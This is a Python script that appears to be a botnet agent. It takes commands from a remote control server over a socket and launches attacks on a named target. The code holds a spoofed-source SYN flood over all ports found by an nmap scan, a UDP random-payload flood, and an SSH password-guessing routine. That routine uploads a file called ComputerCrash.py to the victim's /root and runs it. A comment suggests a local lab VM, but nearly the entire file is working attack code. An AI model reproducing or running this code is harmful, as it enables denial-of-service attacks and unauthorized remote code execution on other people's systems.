#Author Karun Sharma
import socket
from scapy.all import *
import random
import nmap
import string
import requests
import uuid
import time
import os
import paramiko

def synflood(TARGET,TARGETPORT,TIME):
	"""
	This function is a syn flood attack
	"""
	currenttime = time.time()
	timetostop = currenttime + int(TIME)
	while time.time() < timetostop:
		ippacket = IP()
		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
		ippacket.dst = TARGET

		tcppacket = TCP()
		tcppacket.sport = random.randint(0,65535)
		tcppacket.dport = TARGETPORT
		tcppacket.flags = 'S'
		p1 = ippacket / tcppacket
		send(p1, verbose=0)


def generaterandomstring():
	"""
	This function will generate a random string
	"""
	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))

def randombyteflooding(TARGET,DURATION):
	"""
	This function will flood a server using packets of random size
	"""
	currenttime = time.time()
	timetostop = currenttime + int(DURATION)
	while time.time() < timetostop:
		ippacket = IP()
		ippacket.dst = TARGET
		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))

		udppacket = UDP()

		sr(ippacket/udppacket/generaterandomstring(),timeout=2)

def installcontent(TARGET,listofpasswords):
	"""
	This function will install content which will prevent a user from closing gedit
	"""
	for index in range(len(listofpasswords)):
		try:
			client = paramiko.SSHClient()
			client.load_system_host_keys()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			client.connect(TARGET,password=listofpasswords[index])
			client.exec_command('rm /root/ComputerCrash.py')
			client.exec_command('touch /root/ComputerCrash.py')
			client.exec_command('rm /root/content.txt')
			client.exec_command('touch content.txt')
			sftp = client.open_sftp()
			sftp.put(os.getcwd() + '/ComputerCrash.py','/root/ComputerCrash.py')
			sftp.put(os.getcwd() + '/content.txt', '/root/content.txt')
			client.exec_command('python ComputerCrash.py')
		except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
			pass

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

HOST_SERVER = ' '

with open("Config.txt", 'r') as file:
	content = file.readlines()
	lines = content[1]
	HOST_SERVER = lines[13:]
	HOST_SERVER = HOST_SERVER.rstrip()

print('HOST_SERVER = ', HOST_SERVER)

s.connect((HOST_SERVER,11111)) #Reference to local server VM

STATUS = 'READY TO ATTACK'

while True:
	data = s.recv(1024)
	parseddata = data.split("\t")
	
	if "STATUS" in data:
		s.send(STATUS)

	if "EXIT" in data:
		break

	if parseddata[0] == "SYN FLOOD":
		if STATUS != "READY TO ATTACK":
			s.send(STATUS)
		else:
			STATUS = "ATTACKING USING SYN FLOOD"
			nm = nmap.PortScanner()
			nm.scan(parseddata[2],'1-65535')
			getopenports = nm[parseddata[2]].all_tcp()
			for index in range(len(getopenports)):
				synflood(parseddata[2],getopenports[index],parseddata[1])
			with open("log.txt", 'a') as f:
				f.write(str(nm[parseddata[2]].all_tcp()))

	if parseddata[0] == "FLOODING":
		if STATUS != "READY TO ATTACK":
			s.send(STATUS)
		else:
			STATUS = "ATTACKING USING PLAIN FLOODING"
			randombyteflooding(parseddata[1],parseddata[2])
			STATUS = 'READY TO ATTACK'

	if parseddata[0] == "INSTALL":
		if STATUS != "READY TO ATTACK":
			s.send(STATUS)

		else:
			STATUS = "ATTACKING using malicious content"
			print(parseddata[2].split(' '))
			installcontent(parseddata[1],parseddata[2].split(' '))
			STATUS = 'READY TO ATTACK'

	print("Data receieved: {}".format(data))


s.close()
